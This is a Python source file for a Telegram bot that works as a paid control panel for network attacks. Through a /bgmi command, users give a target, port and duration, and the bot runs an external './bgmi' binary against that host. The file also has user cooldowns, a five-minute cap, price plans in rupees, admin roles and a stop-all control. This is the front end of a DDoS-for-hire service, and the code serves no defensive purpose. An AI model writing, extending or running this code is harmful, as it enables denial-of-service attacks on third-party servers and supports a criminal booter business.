import telebot, subprocess, threading, time, os, json, datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ===== ROLES =====
MAIN_ADMIN = "5436530930"
ADMIN_PANEL = set()
USERS_FILE = "users.json"
LOG_FILE = "logs.txt"

ATTACK_LIMIT = 300        # 5 min
COOLDOWN = 1200           # 20 min

running = {}
cooldown = {}
admin_chat = {}

lock = threading.Lock()

# ===== STORAGE =====
def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    return json.load(open(USERS_FILE))

def save_users(data):
    json.dump(data, open(USERS_FILE,"w"))

users = load_users()

# ===== HELPERS =====
def role(uid):
    if uid == MAIN_ADMIN:
        return "MAIN"
    if uid in ADMIN_PANEL:
        return "ADMIN"
    return "USER"

def log(txt):
    with open(LOG_FILE,"a") as f:
        f.write(f"[{datetime.datetime.now()}] {txt}\n")

# ===== INLINE MENU =====
def menu(uid):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🚀 Start Attack", callback_data="bgmi"),
        InlineKeyboardButton("📄 My Logs", callback_data="mylogs"),
        InlineKeyboardButton("📋 Plan", callback_data="plan"),
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
    )
    if role(uid) != "USER":
        kb.add(InlineKeyboardButton("🛑 Stop All", callback_data="stopall"))
    return kb

# ===== ADMIN CHAT RELAY =====
@bot.message_handler(func=lambda m: m.chat.id in admin_chat)
def relay_user(m):
    bot.send_message(MAIN_ADMIN, f"👤 User {m.chat.id}:\n{m.text}")

@bot.message_handler(func=lambda m: str(m.chat.id)==MAIN_ADMIN and m.reply_to_message)
def relay_admin(m):
    try:
        uid = m.reply_to_message.text.split()[2]
        bot.send_message(uid, m.text)
    except:
        pass

# ===== CALLBACKS =====
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid=str(c.message.chat.id)
    if c.data=="contact":
        admin_chat[c.message.chat.id]=True
        bot.send_message(c.message.chat.id,"💬 Admin chat enabled",reply_markup=
            InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ End Admin Chat",callback_data="endchat")
            ))
    elif c.data=="endchat":
        admin_chat.pop(c.message.chat.id,None)
        bot.send_message(c.message.chat.id,"✅ Admin chat closed",reply_markup=menu(uid))
    elif c.data=="bgmi":
        bot.send_message(c.message.chat.id,"Use:\n/bgmi <target> <port> <time>")
    elif c.data=="plan":
        bot.send_message(c.message.chat.id,
            "💎 Plans\n\n"
            "1 Day – ₹100\n"
            "3 Days – ₹150\n"
            "7 Days – ₹300\n\n(Contact admin)")
    elif c.data=="stopall":
        for p in running.values():
            p.terminate()
        running.clear()
        bot.send_message(c.message.chat.id,"🛑 All attacks stopped")

# ===== ATTACK =====
@bot.message_handler(commands=["bgmi"])
def bgmi(m):
    uid=str(m.chat.id)

    if role(uid)=="USER":
        last=cooldown.get(uid)
        if last and time.time()-last<COOLDOWN:
            return bot.reply_to(m,"⏳ Cooldown active")

    if uid in running:
        return bot.reply_to(m,"⚠️ Attack already running")

    try:
        _,t,p,d=m.text.split()
        d=int(d)
        if d>ATTACK_LIMIT:
            return bot.reply_to(m,"❌ Max 5 minutes")
    except:
        return bot.reply_to(m,"Usage: /bgmi <target> <port> <time>")

    proc=subprocess.Popen(["./bgmi",t,p,str(d)])
    running[uid]=proc
    cooldown[uid]=time.time()
    log(f"{uid} {t}:{p} {d}")

    bot.reply_to(m,f"🚀 Attack started\nTarget:{t}\nTime:{d}s")

    def wait():
        proc.wait()
        running.pop(uid,None)
        bot.send_message(uid,"✅ Attack finished")
    threading.Thread(target=wait,daemon=True).start()

# ===== START =====
@bot.message_handler(commands=["start","help"])
def start(m):
    bot.send_message(m.chat.id,"🤖 Control Panel",reply_markup=menu(str(m.chat.id)))

# ===== RUN =====
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(3)
